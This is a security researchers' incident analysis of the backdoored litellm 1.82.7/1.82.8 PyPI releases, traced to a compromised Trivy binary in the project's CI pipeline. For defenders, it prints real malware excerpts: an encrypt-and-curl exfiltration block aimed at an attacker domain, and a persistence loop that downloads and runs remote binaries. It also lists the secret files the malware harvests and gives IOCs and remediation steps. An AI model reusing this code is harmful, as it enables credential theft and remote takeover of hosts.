---
excerpt: "On March 24th, the litellm popular PyPI library was compromised. new versions of litellm were uploaded to PyPI, 1.82.7 and 1.82.8. Both contains malicous payload, this compromise is linked to TeamPCP"
title: "Popular litellm Python package is the latest victim of TeamPCP's ongoing supply chain attack"
date: "March 24, 2026"
description: "Guy Korolevski and Andrii Polkovnychenko, JFrog Security Researchers"
tag: "Real Time Post"
img: /img/RealTimePostImage/post_thumbnail1.png
type: realTimePost
minutes: '8'

---

The JFrog security research team has identified a compromise in the widely used `litellm` PyPI package. As of now, the entire package (all versions) has been quarantined by PyPI. This ongoing compromise is also being tracked by the [open source community](https://github.com/BerriAI/litellm/issues/24512). 

Before we dissect the LiteLLM compromise, it is important to understand the root cause that enabled it. The initial incident began with a supply chain compromise of **Trivy**, the popular open source security scanner used widely in CI/CD pipelines.

Trivy was compromised when an attacker abused a GitHub Actions workflow using `pull_request_target`. **This workflow type runs code from pull requests with elevated repository privileges, including access to the repository’s `GITHUB_TOKEN` and other CI/CD secrets**. 

The JFrog Security Research team had recently identified [OSS CI/CD vulnerabilities](https://jfrog.com/blog/jfrog-ai-bot-stopped-shai-hulud-3/) following this exact pattern through an AI research bot we developed, aiming to proactively detect and prevent similar supply chain attacks. 

In this case, the malicious actors stole the Personal Access Token, took over the repository and used this access to create and publish compromised Trivy binaries and GitHub Actions. As a result, downstream projects that relied on Trivy in their CI/CD pipelines unknowingly pulled and executed malicious code. 

Notable downstream projects that were found to be compromised include:

1. **Checkmarx KICS:** Used Trivy for IaC scanning and pulled the compromised version into its pipelines, allowing malicious code to propagate into KICS builds.  
2. **LiteLLM:** Its CI/CD pipeline executed a malicious version of Trivy, which exfiltrated pipeline credentials that were later used to publish backdoored LiteLLM releases.

In each case the core issue was a supply chain attack triggered by a compromised dependency (Trivy) and CI/CD pipelines that trusted that dependency without integrity verification. In this blog, we walk through the LiteLLM compromise in detail and uncover the techniques used by the attackers.

`litellm` is an open-source Python library that provides a unified interface to call over 100 different LLM APIs (like OpenAI, Anthropic, and VertexAI) using the same input/output format. The package is extremely popular, boasting over 480M lifetime downloads.

LiteLLM’s `security_scans.sh` installed Trivy using the Apt repository method, which always pulled the latest version available from Aquasecurity’s Trivy repo:  
```
sudo apt-get install trivy
```
This command fetches the newest version from the configured repo.  
This meant that any new Trivy release, including a compromised one, would automatically be downloaded and installed whenever the pipeline ran. There was no pinning or checksum verification, so the CI/CD pipeline implicitly trusted whatever version was in the repo.

How did this lead to LiteLLM's compromise?

1. The attackers published a malicious Trivy release (v0.69.4).  
2. [LiteLLM’s CI/CD](https://github.com/BerriAI/litellm/blob/9343aeefca37aa49a6ea54397d7615adae5c72c9/ci_cd/security_scans.sh#L80) pipeline ran the `install_trivy()` step during builds, which automatically downloaded this latest version.  
3. The malicious Trivy binary executed inside the pipeline, exfiltrating CI/CD credentials (e.g. GitHub tokens, PyPI tokens, environment secrets).  
4. These stolen credentials were then used to publish backdoored LiteLLM releases.

On March 24th, new versions of `litellm` were uploaded to PyPI \- `litellm` 1.82.7 and 1.82.8. This version contains a malicious payload in both `proxy_server.py` file and `litellm_init.pth`. 

The C2 addresses and payload have exact similarities to the payload seen on recent TeamPCP npm libraries compromise, containing the same python backdoor script.

![](/img/RealTimePostImage/post/litellm-compromise/image1.png)  

## Attack Chain

The malware operates in three stages:

### Stage 1 \- Bootstrap (planted code in `litellm_init.pth` and `proxy_server.py`)

![](/img/RealTimePostImage/post/litellm-compromise/image2.png)  

A base64-encoded payload is embedded directly in both `proxy_server.py` file and `litellm_init.pth`  
On import/execution, it decodes the payload to a temp file and runs it via `subprocess.run([sys.executable, p])`. This immediately triggers the next stage.

```py
try:
    subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
    subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
    subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
    subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

    subprocess.run([
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
        "https://models[.]litellm[.]cloud/",
        "-H", "Content-Type: application/octet-stream",
        "-H", "X-Filename: tpcp.tar.gz",
        "--data-binary", f"@{bn}"
    ], check=True, stderr=subprocess.DEVNULL)
except Exception:
    pass

```

It then proceeds to execute the collector as a subprocess, Then it captures collector’s stdout into a file, encrypts it and sends to the c2c server `hxxrs[:]//models[.]litellm[.]cloud/`  
It uses asymmetric encryption so only the attacker (who holds the private key) can decrypt.

### Stage 2 \- Credential Harvester (decoded from `B64_SCRIPT`)

![](/img/RealTimePostImage/post/litellm-compromise/image3.png)  
The code performs a comprehensive sweep of the host, collecting everything listed in the next section. Furthermore, if the code is running inside Kubernetes with a service account token available, it enumerates all K8s nodes and deploys a **privileged pod on every node** in the `kube-system` namespace. Each pod mounts the host filesystem at `/` and drops the Stage 3 persistence backdoor via `chroot`.

On the local host, installs the Stage 3 backdoor as a **systemd user service** \- `sysmon.service`.

### Stage 3 \- Persistent Backdoor (`sysmon.py`)

The backdoor is Installed to `~/.config/sysmon/sysmon.py`, registered as a systemd user service named "System Telemetry Service".

```py
req = urllib.request.Request("https[:]//checkmarx[.]zone/raw", headers={'User-Agent': 'Mozilla/5.0'})
with urllib.request.urlopen(req, timeout=10) as r:
    link = r.read().decode('utf-8').strip()
    if link and "youtube.com" not in l:
       urllib.request.urlretrieve(l, TARGET)
       os.chmod(TARGET, 0o755)
       subprocess.Popen([TARGET], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
```

After an initial 300-second (5-minute) sleep, enters an infinite loop:

- Polls `hxxrs[:]//checkmarx[.]zone/raw` every 3000 seconds (\~50 min) for a download URL.  
- Downloads the binary to `/tmp/pglog`, marks it executable, and runs it in a detached session then checks whether it's a youtube link, the similar way it was doing at the previous deployment in recent supply chain attacks  
- Tracks the last-fetched URL in `/tmp/.pg_state` to avoid redundant downloads.

Similar to the previous attacks, the server returns the url link as a placeholder for the real payload.

This gives the attacker the ability to push arbitrary second-stage payloads at any time.

## What It Steals and Where It Sends Data

### Exfiltration Destination

All collected data is encrypted (AES-256-CBC \+ RSA-4096 envelope) and POSTed to `hxxps[:]//models[.]litellm[.]cloud/`  
The domain `models[.]litellm[.]cloud` is attacker-controlled, designed to look like a legitimate `litellm` infrastructure domain.

### Data Collected

| Category | Specific Targets |
| :---- | :---- |
| **System recon** | hostname, whoami, uname \-a, IP addresses, routes, full environment variables (`printenv`) |
| **SSH keys & config** | `id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`, `authorized_keys`, `known_hosts`, `config` from all user home dirs \+ `/root`; SSH host keys from `/etc/ssh` |
| **Git credentials** | `.git-credentials`, `.gitconfig` |
| **AWS** | `~/.aws/credentials`, `~/.aws/config`, `AWS_*` env vars, EC2 IMDS role credentials (IMDSv2), ECS container credentials, Secrets Manager secrets (list \+ retrieve values), SSM parameters |
| **GCP** | `~/.config/gcloud/*`, `application_default_credentials.json`, `GOOGLE_APPLICATION_CREDENTIALS` file |
| **Azure** | `~/.azure/*`, `AZURE_*` env vars |
| **Kubernetes** | `~/.kube/config`, service account tokens \+ CA certs, all secrets across all namespaces, `KUBE_*`/`K8S_*` env vars, `kubectl get secrets` output |
| **Docker** | `~/.docker/config.json` (registry credentials), `/kaniko/.docker/config.json` |
| **Environment files** | `.env`, `.env.local`, `.env.production`, `.env.development`, `.env.staging`, `.env.test` from CWD, parent dirs, `/app`, and recursively from common roots |
| **Database credentials** | `.pgpass`, `my.cnf`, `redis.conf`, `.mongorc.js`, `DB_*`/`DATABASE_*`/`MYSQL_*`/`POSTGRES_*`/`MONGO_*`/`REDIS_*`/`VAULT_*` env vars |
| **CI/CD & IaC** | `terraform.tfvars`, `terraform.tfstate`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`, `ansible.cfg`, Helm configs |
| **TLS/SSL private keys** | `.pem`, `.key`, `.p12`, `.pfx` files from `/etc/ssl/private`, `/etc/letsencrypt`, and all common roots |
| **Auth tokens & secrets** | `.npmrc`, `.vault-token`, `.netrc`, LDAP configs, Postfix SASL passwords |
| **Shell histories** | `.bash_history`, `.zsh_history`, `.sh_history`, `.mysql_history`, `.psql_history`, `.rediscli_history` |
| **VPN** | WireGuard configs (`/etc/wireguard/*.conf`), `wg showconf` output |
| **Webhooks & API keys** | Slack/Discord webhook URLs, API keys/secrets from `.env*`, `.json`, `.yml`, `.yaml` files |
| **Cryptocurrency wallets** | Bitcoin (`wallet.dat`, `bitcoin.conf`), Ethereum (keystore), Litecoin, Dogecoin, Zcash, Dash, Ripple, Monero configs; Solana keypairs (validator, vote, stake, identity, faucet, withdrawer); Cardano signing/verification keys; Anchor project deploy keys |
| **System auth** | `/etc/passwd`, `/etc/shadow`, auth logs (accepted logins) |

## Remediation Plan

LiteLLM fixed this compromise by changing Trivy’s installation to pin a specific Trivy version:
```
TRIVY_VERSION="0.69.3"
wget -qO trivy.deb "https://github.com/aquasecurity/trivy/releases/download/v${TRIVY_VERSION}/trivy_${TRIVY_VERSION}_Linux-64bit.deb"
sudo dpkg -i trivy.deb
```

This prevents automatic installation of a malicious new release, making sure only the specified, trusted version is installed.

### Immediate Actions (Contain)

1. **Identify affected systems**: Audit all environments for `litellm` versions 1.82.7 or 1.82.8 (`pip show litellm`). If found, **Downgrade** litellm to a verified clean version.  
2. **Isolate affected hosts**: Quarantine any system that ran these versions. Assume full credential compromise.  
3. **Kill persistence**:  
   - Stop and disable the systemd service: `systemctl --user stop sysmon.service && systemctl --user disable sysmon.service`  
   - Remove `~/.config/sysmon/sysmon.py` and `~/.config/systemd/user/sysmon.service`  
   - Kill any running `/tmp/pglog` process  
   - Remove `/tmp/pglog` and `/tmp/.pg_state`  
4. **Block C2 domains** at network/DNS level:  
   - `models[.]litellm[.]cloud`  
   - `checkmarx[.]zone`  
5. **K8s-specific**: Check for rogue pods named `node-setup-*` in `kube-system` namespace. Delete them. Check all nodes for the persistence backdoor at `/root/.config/sysmon/`.  
6. **Revoke and Rotate** all exposed credentials from the environment  
7. **Scan for additional persistence**: The downloaded payload (`/tmp/pglog`) is unknown; a full host forensic analysis is recommended.

## Conclusions

As we've seen in the past week, many libraries were compromised with the same payload. The attack is ongoing and has the possibility to target more repositories and ecosystems in the future. Users must be aware of that, and be careful with their software supply chain updates.

The payload as before is broad and diverse, targeting many environments and uses C2 addresses with names and similarities to the same exact library, and to legitimate companies, confusing security incident responders.

This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.

## Indicators of Compromise (IOCs)

1. C2 address \- `hxxrs[:]//models[.]litellm[.]cloud/`  
2. Payload fetch URL \- `hxxrs[:]//checkmarx[.]zone/raw`  
3. `litellm` (PyPI) \- 1.82.7, 1.82.8 (XRAY-955589)

